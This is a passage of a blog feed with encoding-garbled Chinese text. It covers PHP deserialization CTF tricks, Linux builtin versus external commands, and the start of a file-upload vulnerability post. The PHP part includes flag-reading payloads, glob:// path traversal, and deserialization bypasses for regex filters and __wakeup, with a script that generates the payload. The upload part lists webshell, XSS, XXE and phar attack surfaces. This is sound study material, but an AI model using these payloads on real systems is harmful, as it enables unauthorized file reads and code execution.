style="zoom:80%;" /><h4 id="æŸ¥æ‰¾æ–‡ä»¶"><a href="#æŸ¥æ‰¾æ–‡ä»¶" class="headerlink" title="æŸ¥æ‰¾æ–‡ä»¶"></a>æŸ¥æ‰¾æ–‡ä»¶</h4><ul><li><p>æŸ¥æ‰¾æ ¹ç›®å½•çš„flagæ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128123553510.png" alt="image-20221128123553510"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///f*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20221128123054538.png" alt="image-20221128123054538"></p><blockquote><p>â€‹<strong>GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„</strong></p></blockquote><ul><li><p>ç¡®è®¤æ–‡ä»¶è·¯å¾„</p><p>å‡è®¾ç°åœ¨çŸ¥é“flagçš„æ–‡ä»¶åä¸ºflagï¼Œä½†ä¸çŸ¥é“å…·ä½“è·¯å¾„</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># ç›®å½•ç©¿è¶Š</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://../../../flag&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128123216008.png" alt="image-20221128123216008"></p><p>å½“è¾“å‡ºflagæ—¶ï¼Œè¯´æ˜è·¯å¾„æ˜¯æ­£ç¡®çš„ã€‚</p></li></ul><h4 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f1ag</span>=<span class="title function_ invoke__">implode</span>(<span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/flag&#x27;</span>)));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$f1ag</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128122206828.png" alt="image-20221128122206828"></p><h1 id="ä¸€äº›trick"><a href="#ä¸€äº›trick" class="headerlink" title="ä¸€äº›trick"></a>ä¸€äº›trick</h1><p><a href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BF%87%E6%BB%A4">php(phar)ååºåˆ—åŒ–æ¼æ´åŠå„ç§ç»•è¿‡å§¿åŠ¿</a></p><h2 id="GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸"><a href="#GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸" class="headerlink" title="GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸"></a>GCæœºåˆ¶ç»•è¿‡æŠ›å‡ºå¼‚å¸¸</h2><blockquote><p>æ­£å¸¸æƒ…å†µä¸‹æŠ›å‡ºå¼‚å¸¸å¹¶ä¸”æ²¡æœ‰æ•æ‰çš„è¯phpæ˜¯ä¸ä¼šæ‰§è¡Œææ„å‡½æ•°çš„</p><p>ä½†åœ¨laravelè¿™ç§æ¡†æ¶é‡Œé€šå¸¸éƒ½æœ‰å…¨å±€çš„é”™è¯¯å¤„ç†ä¸å¼‚å¸¸æ•æ‰ï¼Œæ˜¾ç¤ºé€šç”¨çš„500æˆ–è€…é”™è¯¯é¡µé¢ã€‚ åªè¦å¼‚å¸¸è¢«æ•æ‰ï¼Œåé¢çš„ææ„å°±ä¼šæ‰§è¡Œäº†ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="keyword">new</span> test, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;i:1;N&#x27;</span>, <span class="string">&#x27;i:0;N&#x27;</span>, <span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><blockquote><p>å› ä¸º<strong>ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯é¡ºåºæ‰§è¡Œ</strong>çš„ï¼Œæ‰€ä»¥åˆ°ç¬¬ä¸€ä¸ªå±æ€§æ—¶ï¼Œä¼šå°†<code>Array[0]</code>è®¾ç½®ä¸ºå¯¹è±¡ï¼ŒåŒæ—¶æˆ‘ä»¬åˆå°†<code>Array[0]</code>è®¾ç½®ä¸º<code>null</code>ï¼Œè¿™æ ·å‰é¢çš„<code>test</code>å¯¹è±¡ä¾¿ä¸¢å¤±äº†å¼•ç”¨ï¼Œå°±ä¼šè¢«GCæ‰€æ•è·ï¼Œå°±å¯ä»¥æ‰§è¡Œ<code>__destruct</code>äº†</p></blockquote><h2 id="ç»•è¿‡æ­£åˆ™"><a href="#ç»•è¿‡æ­£åˆ™" class="headerlink" title="ç»•è¿‡æ­£åˆ™"></a>ç»•è¿‡æ­£åˆ™</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;nonono!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>ç”¨+Oä»£æ›¿O</p></li><li><p>ç”¨æ•°ç»„ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></li></ul><h2 id="ç»•è¿‡å­—ç¬¦è¿‡æ»¤"><a href="#ç»•è¿‡å­—ç¬¦è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å­—ç¬¦è¿‡æ»¤"></a>ç»•è¿‡å­—ç¬¦è¿‡æ»¤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/username/&#x27;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono!!!&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>åºåˆ—å­—ç¬¦ä¸²ä¸­<strong>è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶ï¼Œä¼šè¢«å½“æˆ16è¿›åˆ¶è§£æã€‚</strong></p></blockquote><h2 id="ç»•è¿‡wake-up"><a href="#ç»•è¿‡wake-up" class="headerlink" title="ç»•è¿‡wake_up"></a>ç»•è¿‡wake_up</h2><ul><li><strong>phpç‰ˆæœ¬ PHP5&lt;5.6.25ï¼ŒPHP7 &lt; 7.0.10</strong></li></ul><p><strong>ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœè¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡<code>__wakeup( )</code>çš„æ‰§è¡Œã€‚</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span>= <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Demo</span>);</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$x</span>);<span class="comment">//ç»•è¿‡preg_match()</span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:3:&#x27;</span>,<span class="variable">$x</span>);<span class="comment">//ç»•è¿‡__wakeup()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡ç‰¹å®šå˜é‡èµ‹å€¼"><a href="#ç»•è¿‡ç‰¹å®šå˜é‡èµ‹å€¼" class="headerlink" title="ç»•è¿‡ç‰¹å®šå˜é‡èµ‹å€¼"></a>ç»•è¿‡ç‰¹å®šå˜é‡èµ‹å€¼</h2><ul><li>å¼•ç”¨å˜é‡</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221026153815014.png" alt="image-20221026153815014"></p><blockquote><p>åœ¨phpé‡Œ&amp;ç›¸å½“äºä¸¤ä¸ªå˜é‡éƒ½æŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œä¿®æ”¹ä¸€ä¸ªä¼šå½±å“åˆ°å¦ä¸€ä¸ªã€‚</p></blockquote><h2 id="é€šè¿‡å¯å˜å‡½æ•°è°ƒç”¨ç±»æ–¹æ³•"><a href="#é€šè¿‡å¯å˜å‡½æ•°è°ƒç”¨ç±»æ–¹æ³•" class="headerlink" title="é€šè¿‡å¯å˜å‡½æ•°è°ƒç”¨ç±»æ–¹æ³•"></a>é€šè¿‡å¯å˜å‡½æ•°è°ƒç”¨ç±»æ–¹æ³•</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello a\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;A::test&#x27;</span>; <span class="comment">// è°ƒç”¨ A çš„ test é™æ€æ–¹æ³•</span></span><br><span class="line"><span class="variable">$a</span>(); </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = [<span class="keyword">new</span> <span class="title function_ invoke__">a</span>(), <span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(); <span class="comment">// è°ƒç”¨ A çš„ test é™æ€æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>); <span class="comment">// è°ƒç”¨ A çš„ test é™æ€æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231026200915540.png" alt="image-20231026200915540"></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå‘½ä»¤æœ¬è´¨</title>
      <link href="/2023/05/31/%E5%91%BD%E4%BB%A4%E6%9C%AC%E8%B4%A8/"/>
      <url>/2023/05/31/%E5%91%BD%E4%BB%A4%E6%9C%AC%E8%B4%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="å‘½ä»¤æœ¬è´¨"><a href="#å‘½ä»¤æœ¬è´¨" class="headerlink" title="å‘½ä»¤æœ¬è´¨"></a>å‘½ä»¤æœ¬è´¨</h2><p>å‘½ä»¤å®é™…ä¸Šå°±æ˜¯å…·æœ‰ä¸€å®šåŠŸèƒ½çš„äºŒè¿›åˆ¶æ–‡ä»¶</p><h2 id="å‘½ä»¤ä½ç½®"><a href="#å‘½ä»¤ä½ç½®" class="headerlink" title="å‘½ä»¤ä½ç½®"></a>å‘½ä»¤ä½ç½®</h2><p>&#x2F;bin,&#x2F;usr&#x2F;binï¼Œé»˜è®¤éƒ½æ˜¯å…¨ä½“ç”¨æˆ·ä½¿ç”¨</p><p>&#x2F;sbin,&#x2F;usr&#x2F;sbin,é»˜è®¤rootç”¨æˆ·ä½¿ç”¨</p><h2 id="æ‰§è¡Œè¿‡ç¨‹"><a href="#æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="æ‰§è¡Œè¿‡ç¨‹"></a>æ‰§è¡Œè¿‡ç¨‹</h2><p><img src="/../images/4dbf34717d434bb692683937feb52fea.png" alt="img"></p><h2 id="å‘½ä»¤åˆ†ç±»â€“å¤–éƒ¨å’Œå†…å»º"><a href="#å‘½ä»¤åˆ†ç±»â€“å¤–éƒ¨å’Œå†…å»º" class="headerlink" title="å‘½ä»¤åˆ†ç±»â€“å¤–éƒ¨å’Œå†…å»º"></a>å‘½ä»¤åˆ†ç±»â€“å¤–éƒ¨å’Œå†…å»º</h2><blockquote><p>å†…å»ºå‘½ä»¤å®é™…ä¸Šæ˜¯shellç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œç®€å•å¿«é€Ÿç³»ç»Ÿbashå†…ç½®æºç <br>æ¯”å¦‚ï¼šexitï¼Œhistoryï¼Œcdï¼Œechoç­‰ã€‚</p><p>å¤–éƒ¨å‘½ä»¤æ˜¯linuxç³»ç»Ÿä¸­çš„å®ç”¨ç¨‹åºéƒ¨åˆ†ï¼Œå¤–éƒ¨å‘½ä»¤çš„å®ä½“å¹¶ä¸åŒ…å«åœ¨shellä¸­ï¼Œä½†æ˜¯å…¶å‘½ä»¤æ‰§è¡Œè¿‡ç¨‹æ˜¯ç”±shellç¨‹åºæ§åˆ¶çš„ã€‚å¤–éƒ¨å‘½ä»¤æ˜¯åœ¨bashä¹‹å¤–é¢å¤–å®‰è£…çš„ï¼Œé€šå¸¸æ”¾åœ¨&#x2F;binï¼Œ&#x2F;usr&#x2F;binï¼Œ&#x2F;sbinï¼Œ&#x2F;usr&#x2F;sbinç­‰</p></blockquote><ul><li><p>æŸ¥çœ‹å¤–éƒ¨å‘½ä»¤å­˜å‚¨ä½ç½®</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220710194138135-1686283886642.png" alt="image-20220710194138135"></p><p>æ³¨ï¼šè¿™é‡Œçš„PATHå°±æ˜¯ç»å¸¸æåˆ°çš„ç¯å¢ƒå˜é‡</p><blockquote><p>å½“ç”¨æˆ·æ‰§è¡Œçš„æ˜¯å¤–éƒ¨å‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šåœ¨æŒ‡å®šçš„å¤šä¸ªè·¯å¾„ä¸­æŸ¥æ‰¾commandçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œå®šä¹‰è¿™äº›è·¯å¾„çš„å˜é‡ï¼Œå°±ç§°ä¸º PATH ç¯å¢ƒå˜é‡ï¼Œå…¶ä½œç”¨å°±æ˜¯å‘Šè¯‰ Shell å¾…æ‰§è¡Œå‘½ä»¤çš„å¯æ‰§è¡Œæ–‡ä»¶å¯èƒ½å­˜æ”¾çš„ä½ç½®ï¼ŒShell ä¼šåœ¨ PATH å˜é‡åŒ…å«çš„å¤šä¸ªè·¯å¾„ä¸­é€ä¸ªæŸ¥æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°ä¸ºæ­¢ï¼ˆå¦‚æœæ‰¾ä¸åˆ°ï¼ŒShell ä¼šæä¾›ç”¨æˆ·â€œæ‰¾ä¸åˆ°æ­¤å‘½ä»¤â€ï¼‰ã€‚</p></blockquote></li><li><p>åˆ¤æ–­å‘½ä»¤æ˜¯å¦ä¸ºå¤–éƒ¨è¿˜æ˜¯å†…å»ºå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> <span class="built_in">command</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type cd</span><br><span class="line">cd is a shell builtin</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type vim</span><br><span class="line">vim is /usr/bin/vim</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type ps</span><br><span class="line">ps is hashed (/usr/bin/ps)</span><br></pre></td></tr></table></figure></li><li><p>åŒºåˆ«</p><ul><li><p>å¤–éƒ¨å‘½ä»¤</p><blockquote><p>å½“å¤–éƒ¨å‘½ä»¤æ‰§è¡Œæ—¶ï¼Œä¼šåˆ›å»ºå‡ºä¸€ä¸ªå­è¿›ç¨‹ã€‚è¿™ç§æ“ä½œè¢«ç§°ä¸ºè¡ç”Ÿï¼ˆforkingï¼‰ã€‚å¤–éƒ¨å‘½ä»¤pså¾ˆæ–¹ä¾¿æ˜¾ç¤ºå‡ºå®ƒçš„çˆ¶è¿›ç¨‹ä»¥åŠè‡ªå·±æ‰€å¯¹åº”çš„è¡ç”Ÿå­è¿›ç¨‹ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root      8986  8984  0 17:17 pts/0    00:00:00 -bash</span><br><span class="line">root      9054  8986  0 17:53 pts/0    00:00:00 ps -f</span><br></pre></td></tr></table></figure><p>psè¿›ç¨‹çš„PPIDä¸º-bashçš„PIDã€‚</p><p><img src="/../images/image-20220923175907599.png" alt="image-20220710194138135"></p></li><li><p>å†…å»ºå‘½ä»¤</p><blockquote><p>å†…å»ºå‘½ä»¤å’Œå¤–éƒ¨å‘½ä»¤çš„åŒºåˆ«åœ¨äºå‰è€…ä¸éœ€è¦ä½¿ç”¨å­è¿›ç¨‹æ¥æ‰§è¡Œã€‚</p><p>å› ä¸ºæ—¢ä¸éœ€è¦é€šè¿‡è¡ç”Ÿå‡ºå­è¿›ç¨‹æ¥æ‰§è¡Œï¼Œä¹Ÿä¸éœ€è¦æ‰“å¼€ç¨‹åºæ–‡ä»¶ï¼Œå†…å»ºå‘½ä»¤çš„æ‰§è¡Œé€Ÿåº¦è¦æ›´</p><p>å¿«ï¼Œæ•ˆç‡ä¹Ÿæ›´é«˜ã€‚</p></blockquote></li></ul></li><li><p>æœ‰äº›å‘½ä»¤æœ‰å¤šç§å®ç°æ–¹å¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type -a cd</span><br><span class="line">cd is a shell builtin</span><br><span class="line">cd is /usr/bin/cd</span><br></pre></td></tr></table></figure><blockquote><p>å¯¹äºæœ‰å¤šç§å®ç°çš„å‘½ä»¤ï¼Œå¦‚æœæƒ³è¦ä½¿ç”¨å…¶å¤–éƒ¨å‘½ä»¤å®ç°ï¼Œç›´æ¥æŒ‡æ˜å¯¹åº”çš„æ–‡ä»¶å°±å¯ä»¥äº†ã€‚</p><p>ä¾‹å¦‚ï¼Œè¦ä½¿ç”¨å¤–éƒ¨å‘½ä»¤pwdï¼Œå¯ä»¥è¾“å…¥&#x2F;bin&#x2F;pwdã€‚</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´å±å®³â€“æ”»å‡»é¢"><a href="#æ¼æ´å±å®³â€“æ”»å‡»é¢" class="headerlink" title="æ¼æ´å±å®³â€“æ”»å‡»é¢"></a>æ¼æ´å±å®³â€“æ”»å‡»é¢</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Webshellç±»ï¼šè„šæœ¬æ–‡ä»¶</span><br><span class="line">XSSç±»ï¼šsvgï¼Œhtmlï¼Œpdfæ–‡ä»¶,å¦‚æœåç«¯ä¸ºnodejsï¼Œå¯ä»¥xss to rce</span><br><span class="line">XXEç±»ï¼šdocxã€xlsxï¼Œsvg</span><br><span class="line">RCEç±»ï¼špharæ–‡ä»¶ï¼Œé…åˆæ–‡ä»¶è¯»å–ååºåˆ—åŒ–æ”»å‡» # é¸¡è‚‹ï¼Œè¦æœ‰æºç ï¼Œè¿˜è¦æœ‰å±é™©æ–¹æ³•</span><br><span class="line">ç›®å½•ç©¿è¶Šï¼šå‹ç¼©åŒ…è§£å‹ï¼Œæ–‡ä»¶è·¯å¾„å¯æ§  åæœï¼šæ–‡ä»¶è¦†ç›–ï¼Œsshå…¬é’¥ï¼Œè®¡åˆ’ä»»åŠ¡ï¼Œè„šæœ¬æ–‡ä»¶ä¸Šä¼ åˆ°å¯æ‰§è¡Œwebç›®å½•ä¸‹....</span><br></pre></td></tr></table></figure><h1 id="PHPç›¸å…³ä»£ç "><a href="#PHPç›¸å…³ä»£ç " class="headerlink" title="PHPç›¸å…³ä»£ç "></a>PHPç›¸å…³ä»£ç </h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;file&#x27;]æ˜¯Content-Dispositionä¸­nameçš„å€¼</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] å®¢æˆ·ç«¯æ–‡ä»¶åç§°</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] æ–‡ä»¶çš„MIMEç±»å‹       image/jpeg,image/png,application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] æ–‡ä»¶å¤§å° å•ä½å­—èŠ‚</span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] æ–‡ä»¶è¢«ä¸Šä¼ åå†æœåŠ¡å™¨ç«¯ä¸´æ—¶æ–‡ä»¶åï¼Œå¯ä»¥åœ¨php.iniä¸­æŒ‡å®š</span><br><span class="line">    </span><br><span class="line"><span class="comment"># åŠ å…¥æ–‡ä»¶å¤´ç»•è¿‡ï¼šGIF89a  </span></span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>()  å›¾ç‰‡å¤§å°</span><br><span class="line"><span class="title function_ invoke__">exif_imagetype</span>()  å›¾ç‰‡ç±»å‹</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ è¿‡ç¨‹</p><blockquote><p>åœ¨æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œæ–‡ä»¶é»˜è®¤è¢«å‚¨å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸­ï¼Œè¿™æ—¶å¿…é¡»æŠŠä»–ä»ä¸´æ—¶ç›®å½•ä¸­åˆ é™¤æˆ–ç§»åŠ¨åˆ°å…¶ä»–åœ°æ–¹ï¼Œå¦åˆ™ï¼Œè„šæœ¬è¿è¡Œå®Œæ¯•åï¼Œè‡ªåŠ¨åˆ é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨<code>copyæˆ–</code>è€…<code>move_uploaded_file</code>ä¸¤ä¸ªå‡½æ•°ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . 